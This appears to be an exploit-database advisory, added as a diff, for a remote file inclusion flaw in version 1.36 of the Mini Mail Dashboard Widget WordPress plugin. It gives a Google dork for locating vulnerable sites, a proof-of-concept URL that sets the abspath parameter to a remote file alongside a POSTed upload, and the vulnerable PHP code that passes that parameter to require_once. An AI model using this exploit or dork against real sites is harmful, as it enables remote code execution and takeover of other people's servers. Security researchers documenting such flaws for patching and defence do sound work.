@@ -1,0 +1,22 @@
+# Exploit Title: Mini Mail Dashboard Widget Wordpress plugin RFI
+# Google Dork: inurl:wp-content/plugins/mini-mail-dashboard-widget
+# Date: 09/19/2011
+# Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+# Software Link: http://wordpress.org/extend/plugins/mini-mail-dashboard-widget/download/
+# Version: 1.36 (tested)
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/mini-mail-dashboard-widgetwp-mini-mail.php?abspath=RFI (requires POSTing a file with ID wpmm-upload for this to work)
+
+---
+Vulnerable Code
+---
+if (isset($_FILES['wpmm-upload'])) {
+	// Create WordPress environmnt
+	require_once(urldecode($_REQUEST['abspath']) . 'wp-load.php');
+
+	// Handle attachment
+	WPMiniMail::wpmm_upload();
+}
